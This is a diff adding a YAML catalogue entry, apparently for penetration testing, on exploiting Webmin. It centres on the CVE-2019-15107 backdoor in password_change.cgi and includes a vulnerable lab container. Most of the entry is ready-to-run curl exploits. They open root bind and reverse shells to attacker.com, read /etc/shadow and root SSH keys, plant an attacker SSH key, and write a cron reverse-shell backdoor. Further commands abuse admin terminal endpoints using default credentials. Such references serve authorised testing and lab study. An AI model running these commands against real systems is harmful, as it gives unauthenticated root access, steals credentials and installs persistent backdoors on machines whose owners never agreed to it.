@@ -1,0 +1,185 @@
+---
+comment: |
+  Webmin is a web-based system administration interface for Unix/Linux, typically
+  running on port 10000 as root. Two notable exploitation paths exist:
+
+  1. CVE-2019-15107 (CVSS 9.8): A backdoor was covertly inserted into Webmin 1.890
+     distributed via SourceForge. The password_change.cgi script executes the value
+     of the `old` parameter as a shell command when `expired=2` is present, without
+     requiring authentication. The backdoor was present for approximately 12 months.
+
+  2. CVE-2022-0824 (CVSS 8.8): Authenticated low-privileged Webmin users can read
+     arbitrary files and execute OS commands as root by exploiting the file manager
+     module's lack of privilege validation. Affects Webmin < 1.990.
+
+  Admin-level RCE without a CVE: Webmin exposes a direct terminal interface
+  (Tools > Terminal) and custom command execution (Others > Custom Commands)
+  that run as root on the host system.
+docker:
+  compose: "services:\n  webmin:\n    image: vulnerable/webmin:1.890\n    ports:\n\
+    \      - \"10000:10000\"\n    environment:\n      ROOT_PASSWORD: root\n"
+  note: "Starts Webmin 1.890 (vulnerable to CVE-2019-15107 unauthenticated RCE backdoor).\n\
+    Access at `https://localhost:10000` (self-signed TLS \u2014 use curl -k).\nThe\
+    \ backdoor in password_change.cgi fires without login. No setup required.\nDefault\
+    \ credentials (if needed for admin paths): root / root or admin / admin.\n"
+functions:
+  bind-shell:
+  - code: |
+      # CVE-2019-15107: bind shell via backdoor
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=ncat -lvp 12345 -e /bin/sh &" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+    comment: |
+      CVE-2019-15107: opens a root bind shell on TCP 12345 via the backdoor.
+      The trailing & detaches ncat from the HTTP request. Connect with: nc victim.com 12345
+      Requires ncat (nmap package). The shell runs as root.
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      1.890 (backdoored SourceForge release)
+  file-read:
+  - code: |
+      # CVE-2019-15107: read arbitrary files via command injection in password_change.cgi
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=cat /etc/shadow" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+
+      # Read Webmin configuration (contains module passwords and settings):
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=cat /etc/webmin/miniserv.conf" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+    comment: |
+      CVE-2019-15107: reads arbitrary server-side files via the backdoor command injection.
+      Webmin runs as root, so all files are readable.
+      Key files:
+      - /etc/shadow  (hashed passwords for all system users)
+      - /etc/webmin/miniserv.conf  (Webmin config: session keys, SSL certs, ACLs)
+      - /root/.ssh/id_rsa  (SSH private key for root)
+      - /etc/webmin/*.acl  (per-module ACL configuration)
+    contexts:
+      unauthenticated:
+    version: |
+      1.890 (backdoored SourceForge release)
+  file-write:
+  - code: |
+      # CVE-2019-15107: write arbitrary files via backdoor (runs as root)
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=echo 'ssh-ed25519 AAAA...attacker_key... attacker' >> /root/.ssh/authorized_keys" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+
+      # Or add a cron backdoor:
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=echo '* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1' > /etc/cron.d/backdoor" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+    comment: |
+      CVE-2019-15107: write arbitrary files as root via the backdoor command injection.
+      Since Webmin runs as root, any path on the filesystem is writable.
+      SSH key injection provides persistent, passwordless root access.
+    contexts:
+      unauthenticated:
+    version: |
+      1.890 (backdoored SourceForge release)
+  rce:
+  - code: |
+      # CVE-2019-15107: unauthenticated RCE via backdoor in password_change.cgi
+      # The `old` parameter is passed to Perl's backtick operator when expired=2
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        -d "user=root&pam=&expired=2&old=id|tee+/tmp/out&new1=x&new2=x"
+
+      # Or use GET (both methods work):
+      curl -sk "https://victim.com:10000/password_change.cgi?user=root&pam=&expired=2&old=id|tee+/tmp/out&new1=x&new2=x"
+    comment: "CVE-2019-15107: Webmin 1.890 distributed from SourceForge contained\
+      \ a backdoor\nin password_change.cgi. When expired=2 is set, the script executes:\n\
+      \  system(\"$old_password\") or open(FILE,\"$old_password |\")\ninjecting the\
+      \ `old` parameter value into a shell command without sanitisation.\nNo authentication\
+      \ required. Command output is returned in the HTTP response body.\nThe backdoor\
+      \ was in Webmin 1.890 only \u2014 verify the version before attempting.\nRef:\
+      \ https://www.exploit-db.com/exploits/47230\nMetasploit: use exploit/unix/webapp/webmin_backdoor\n\
+      nuclei: CVE-2019-15107\n"
+    contexts:
+      unauthenticated:
+    version: |
+      1.890 (backdoored SourceForge release)
+  - code: |
+      # Admin RCE via Webmin Terminal (Tools > Terminal)
+      # Navigate to: https://victim.com:10000/terminal/index.cgi
+      # The terminal provides a full interactive shell session in the browser as root.
+      # Equivalent via the Others > Custom Commands module (requires custom commands enabled):
+      curl -sk -X POST "https://victim.com:10000/custom/run.cgi" \
+        -b "sid=<session_id>" \
+        --data-urlencode "cmd=id"
+    comment: |
+      Webmin runs as root and exposes a direct terminal interface at Tools > Terminal
+      (/terminal/index.cgi). Any authenticated administrator obtains an immediate root
+      shell in the browser. No additional exploitation steps required.
+      The Custom Commands module (Others > Custom Commands) allows creating and running
+      arbitrary shell commands via the web UI or the /custom/run.cgi endpoint.
+      Session ID is obtained by POSTing credentials to /session_login.cgi.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2019-15107: reverse bash shell via backdoor pipe injection
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode "old=bash -i >& /dev/tcp/attacker.com/12345 0>&1" \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+    comment: "CVE-2019-15107: spawns a reverse root shell via the password_change.cgi\
+      \ backdoor.\nThe shell runs as root since Webmin's miniserv daemon runs as root\
+      \ by default.\nThe HTTP response returns immediately \u2014 check the listener\
+      \ for the connection.\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      1.890 (backdoored SourceForge release)
+  - blind: true
+    code: |
+      # Admin reverse shell via Custom Commands or Terminal module
+      # POST to the session login endpoint to obtain a session cookie:
+      SID=$(curl -sk -c /tmp/wm.jar -X POST "https://victim.com:10000/session_login.cgi" \
+        -d "page=%2F&user=root&pass=root" -D - | grep "sid=" | sed 's/.*sid=//;s/;.*//')
+
+      # Execute a reverse shell via the terminal API:
+      curl -sk -X POST "https://victim.com:10000/terminal/index.cgi" \
+        -b "sid=${SID}" \
+        --data-urlencode "cmd=bash -i >& /dev/tcp/attacker.com/12345 0>&1 &"
+    comment: |
+      Admin reverse shell via the Webmin Terminal module. The session cookie is obtained
+      by authenticating to /session_login.cgi. The shell runs as root.
+      Alternative: use the Custom Commands module at /custom/run.cgi.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+...
